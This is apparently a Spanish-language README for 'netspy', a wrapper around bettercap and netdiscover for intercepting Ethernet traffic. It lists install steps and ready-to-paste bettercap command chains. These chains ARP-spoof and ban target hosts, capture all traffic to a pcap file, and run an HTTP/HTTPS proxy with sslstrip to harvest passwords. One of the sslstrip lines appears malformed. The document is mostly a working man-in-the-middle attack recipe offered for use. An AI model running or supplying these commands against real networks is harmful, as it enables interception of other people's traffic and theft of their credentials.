# Interceptacion Ethernet
Escemarios:
<img style="float:left" alt="Escenarios interceptacion" src="https://github.com/hackingyseguridad/netspy/blob/master/MiTM.png">
#
<img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/netspy/blob/master/netspy.png">

# netspy

# 1.- Descubre elementos de red 2.- Captura y muestra en pantalla el trafico.

# Instalacion:

apt-get install bettercap

apt-get install netdiscover

git clone https://github.com/hackingyseguridad/netspy

cd netspy

chmod 777 netspy

# Uso.:

sh netspy

sh proxynetspy

netdiscover

IMPORTANTE: Para salir del modo de descubrimiento 'net probe on' y empezar a esnifar teclea 'exit'.

# Bettercap v2.9

Escanear toda la Red:

net.probe on; ticker on

Banear tarjet IP con ARP:

set arp.spoof.targets IP; arp.spoof on; set arp.ban on; net.probe on

Capturar trafico en fichero siff_all.pcap:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sniff_all.pcap; set net.sniff.verbose false; net.sniff on

Ver Trafico:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on

Ver trafico web por proxy y extrae claves:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true

Ver trafico web por proxy y extrae claves de cifrados debiles:

net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on;  true; set http.proxy.port 80; set https.proxy.port 443; http.proxy on; https.proxy on; set http.proxy.sslstrip


Versiones antiguas Bettercap: 1.6.1 y 1.6.2 en Python

https://github.com/hackingyseguridad/mitm

www.hackingyseguridad.com
